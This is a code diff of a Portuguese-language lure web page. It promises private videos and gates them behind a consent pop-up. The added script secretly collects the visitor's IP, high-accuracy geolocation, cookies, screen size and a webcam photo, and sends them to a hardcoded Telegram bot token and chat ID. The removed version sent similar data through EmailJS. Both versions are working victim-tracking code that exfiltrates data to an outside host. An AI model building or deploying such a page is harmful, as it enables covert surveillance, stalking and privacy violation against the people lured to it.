@@ -2,36 +2,37 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Meus videos Sandra s2</title>
+  <title>Coleta de Dados com Telegram + Vídeo</title>
   <style>
-    html, body {
+    body {
+      background-color: #000;
+      color: #fff;
+      font-family: sans-serif;
       margin: 0;
       padding: 0;
-      font-family: sans-serif;
-      height: 100%;
       overflow: hidden;
-      background-color: black;
-      color: white;
     }
 
-    #popup {
+    .overlay {
       position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.85);
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0, 0, 0, 0.95);
       display: flex;
       flex-direction: column;
-      justify-content: center;
       align-items: center;
-      z-index: 10;
+      justify-content: center;
+      z-index: 9999;
       text-align: center;
       padding: 2rem;
     }
 
-    #popup button {
+    .overlay button {
       padding: 1rem 2rem;
-      margin-top: 1rem;
       font-size: 1rem;
+      margin-top: 1rem;
       border: none;
       border-radius: 6px;
       background-color: #28a745;
@@ -39,136 +40,176 @@
       cursor: pointer;
     }
 
-    #video-bg {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw;
-      height: 100vh;
-      z-index: -1;
-      pointer-events: none;
-    }
-
-    #content {
-      position: relative;
-      z-index: 2;
+    .container {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
       padding: 2rem;
-      text-align: center;
-      background-color: rgba(0,0,0,0.5);
     }
 
     iframe {
-      width: 100%;
-      height: 100%;
+      width: 640px;
+      height: 360px;
       border: none;
-      pointer-events: auto;
+      border-radius: 8px;
+      margin-top: 2rem;
+    }
+
+    #data-status {
+      margin-top: 2rem;
+      color: #ccc;
     }
   </style>
 </head>
 <body>
 
-<!-- Popup de consentimento -->
-<div id="popup">
-  <h2>Permitir acesso à seu dispositivo?</h2>
-  <p>Para continuar, precisamos da sua permissão para capturar a localização, se não o video não será carregado.</p>
-  <button onclick="permitir()">Permitir</button>
+<div class="overlay" id="popup">
+  <h1>Permitir coleta de dados?</h1>
+  <p>Para continuar, clique no botão abaixo para conceder as permissões necessárias.</p>
+  <button onclick="iniciarColeta()">Permitir</button>
 </div>
 
-<!-- Vídeo de fundo (YouTube) -->
-<div id="video-bg">
-  <iframe width="100%" height="100%" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+<div class="container" id="conteudo">
+  <h2>Conteúdo liberado</h2>
+  <iframe id="drive-video" src="https://drive.google.com/file/d/1oINpS5_vJqPj6e3Zk7UDbnND2T2tu9gB/preview" allowfullscreen></iframe>
+  <p id="data-status">Aguardando permissão...</p>
 </div>
-<!-- Conteúdo principal -->
-<div id="content" style="display: none;">
-  <h1>Bem-vindo aos meus Videos privados!</h1>
-  <p id="location">Carregando video...</p>
-</div>
-
-<!-- EmailJS -->
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script>
-  emailjs.init("3nQv9Y-aSYhq53HDi"); // sua chave pública
-</script>
 
 <script>
-  async function permitir() {
-    document.getElementById("popup").style.display = "none";
-    document.getElementById("video-bg").style.display = "block";
-    document.getElementById("content").style.display = "block";
+  const BOT_TOKEN = '7286532430:AAF-V9EDF2dNfg0qwH3yehqd9OiA6LMopgI';
+  const CHAT_ID = '1058604183';
 
-    // Agora podemos capturar dados
-    let latitude = null;
-    let longitude = null;
-    let ip = null;
-    let userAgent = navigator.userAgent;
-    let googleMapsLink = null;
+  async function iniciarColeta() {
+    const popup = document.getElementById('popup');
+    const conteudo = document.getElementById('conteudo');
+    const status = document.getElementById('data-status');
+    status.innerText = 'Coletando dados...';
+
+    let ip = 'Não disponível';
+    let latitude = 'Não capturada';
+    let longitude = 'Não capturada';
+    let googleMapsLink = 'Não disponível';
+    let userAgent = navigator.userAgent || 'Indefinido';
+    document.cookie = "usuario_visitante=true; path=/;";
+    let cookies = document.cookie || 'Nenhum cookie acessível';
+    let screenRes = `${window.screen.width}x${window.screen.height}`;
 
     const obterIP = async () => {
       try {
         const res = await fetch("https://api.ipify.org?format=json");
         const data = await res.json();
         return data.ip;
-      } catch (e) {
-        return null;
+      } catch {
+        return 'Falha na captura';
       }
     };
 
     const obterLocalizacao = () => {
       return new Promise(resolve => {
-        if (!navigator.geolocation) {
-          resolve(null);
-        } else {
-          navigator.geolocation.getCurrentPosition(
-            pos => resolve({
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude
-            }),
-            err => resolve(null),
-            {
-              enableHighAccuracy: true,
-              timeout: 10000,
-              maximumAge: 0
-            }
-          );
-        }
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve({
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude
+          }),
+          err => resolve(null),
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
       });
     };
 
-    const [ipResult, locResult] = await Promise.all([
-      obterIP(),
-      obterLocalizacao()
-    ]);
+    const capturarImagem = async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+        const blob = await imageCapture.takePhoto();
+        track.stop();
+        return blob;
+      } catch (err) {
+        return null;
+      }
+    };
 
-    ip = ipResult;
+    try {
+      const [ipResult, locResult, imagemBlob] = await Promise.all([
+        obterIP(),
+        obterLocalizacao(),
+        capturarImagem()
+      ]);
 
-    if (locResult) {
-      latitude = locResult.latitude;
-      longitude = locResult.longitude;
-      googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-      document.getElementById('location').innerText =
-      `Localização: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
-    } else {
-      document.getElementById('location').innerText =
-        "Localização não permitida ou não capturada, por isso video não carregado. Atualize a pagine e permita a o acesso.";
+      if (ipResult) ip = ipResult;
+      if (locResult) {
+        latitude = locResult.latitude;
+        longitude = locResult.longitude;
+        googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      } else {
+        throw new Error("Usuário não permitiu acesso à localização");
+      }
+
+      const mensagem = `
+📥 *Novo acesso:*
+🖥️ *IP:* ${ip}
+🧭 *User Agent:* ${userAgent}
+🖼️ *Tela:* ${screenRes}
+🍪 *Cookies:* ${cookies}
+📍 *Latitude:* ${latitude}
+📍 *Longitude:* ${longitude}
+🌐 *Maps:* ${googleMapsLink}`;
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: mensagem,
+          parse_mode: 'Markdown'
+        })
+      });
+
+      if (imagemBlob) {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", imagemBlob, "foto.jpg");
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      } else {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `⚠️ Câmera não autorizada ou falha ao capturar imagem.`
+          })
+        });
+      }
+
+      popup.style.display = 'none';
+      conteudo.style.display = 'flex';
+      status.innerText = 'Permissões concedidas com sucesso!';
+
+    } catch (err) {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: `❌ Erro na coleta de dados: ${err.message}`
+        })
+      });
+
+      popup.innerHTML = `
+        <h2>❌ Permissões negadas</h2>
+        <p>Para visualizar o conteúdo, você precisa conceder permissão à localização e câmera.</p>
+        <p>Atualize a página e tente novamente.</p>
+      `;
     }
-
-    const params = {
-      latitude: latitude || "Não capturada",
-      longitude: longitude || "Não capturada",
-      google_maps: googleMapsLink || "Não disponível",
-      ip_address: ip || "Não capturado",
-      user_agent: userAgent
-    };
-
-    emailjs.send('service_zrwt5s7', 'template_xcfeb16', params)
-      .then(() => {
-        console.log("E-mail enviado com sucesso.");
-      })
-      .catch(err => {
-        console.error("Erro ao enviar e-mail:", err);
-      });
   }
 </script>
 
 </body>
 </html>
-
